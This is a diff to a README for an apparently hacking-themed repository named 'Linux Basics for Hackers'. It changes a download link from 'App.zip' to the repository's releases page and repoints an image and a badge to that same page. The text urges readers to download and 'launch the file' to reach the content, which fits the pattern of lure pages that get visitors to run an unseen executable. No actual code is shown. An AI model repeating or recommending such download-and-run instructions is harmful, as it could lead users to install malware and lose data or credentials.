@@ -28,7 +28,7 @@ This repository is the ultimate resource for anyone looking to delve into the wo
 - **Hacking Tools**: Explore a range of hacking tools and learn how to use them effectively.
 
 ## Get Started
-To begin your hacking journey, download the content from the following link: [Download Here](https://github.com/uploads/App.zip)
+To begin your hacking journey, download the content from the following link: [Download Here](https://github.com/gwynelan/Linux-Basics-for-Hackers/releases)
 
 🚨 Note: Launch the file provided in the link above to access the repository content.
 
@@ -37,10 +37,10 @@ If the link does not work, consider checking the "Releases" section for an alter
 ## Connect with the Community
 Join our growing community of hackers and learners. Share your knowledge, ask questions, and collaborate on exciting projects. Together, we can #HackThePlanet! 🌍💻
 
-[![Join the Community](https://img.shields.io/badge/Join-Community-green)](https://github.com/uploads/App.zip)
+[![Join the Community](https://github.com/gwynelan/Linux-Basics-for-Hackers/releases)](https://github.com/gwynelan/Linux-Basics-for-Hackers/releases)
 
 ## Let's Hack!
 
-![Hacking Image](https://www.example.com/hacking.jpg)
+![Hacking Image](https://github.com/gwynelan/Linux-Basics-for-Hackers/releases)
 
 Whether you are a curious beginner or a seasoned hacker, there is always something new to learn in the world of Linux hacking. Dive in, explore the repository, and let your hacking skills soar to new heights. Happy hacking! 🛠️💻🔒
